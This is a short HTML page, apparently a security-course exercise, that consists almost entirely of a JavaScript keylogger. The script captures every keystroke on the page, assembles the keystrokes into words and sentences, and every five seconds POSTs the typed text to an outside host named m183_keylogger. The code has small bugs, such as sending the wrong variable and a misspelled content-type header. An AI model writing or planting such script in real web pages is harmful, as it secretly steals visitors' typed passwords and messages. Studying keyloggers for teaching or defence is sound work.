<!doctype html>
<html class="no-js" lang="">

<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge, chrome=1, ">
  

  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/main.css">
</head>

<body>
    <script type="text/javascript">
        var word = "";
        var sentence = "";
        var text = "";
        //Add event listener to all keyboard events
        document.addEventListener("keydown", function (event) {

            //log the results to the developer console of the browser (press: f12)
            var character_code = event.which || event.keyCode; //depending on brwoser support
            var character_value = String.fromCharCode(character_code);

            console.log(character_code + " " + character_value);

            //console characters anyway
            word = word + character_value;

            if(character_code == 32)
            {
                console.log("Word: " + word);
                sentence = sentence + word; // adds the word to the sentence
                word = "";
            }

            if(character_code == 13 || character_code == 190)
            {
                console.log("Sentence: " + sentence);
                text = text + sentence + word; // get the last word as well
                word = "";
                sentence = "";
            }

        });

        setInterval(function () {
            if (text.length > 0)
            {
                console.log("Text for Submission:" + text);

                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'http://m183_keylogger/index.html');
                xhr.setRequestHeader('Content-Type', 'application/x-www-for-urlencoded');
                xhr.send('sentence=' + sentence);

                text = ""; sentence = ""; word = "";
            }
        }, 5000);

    </script>
</body>

</html>
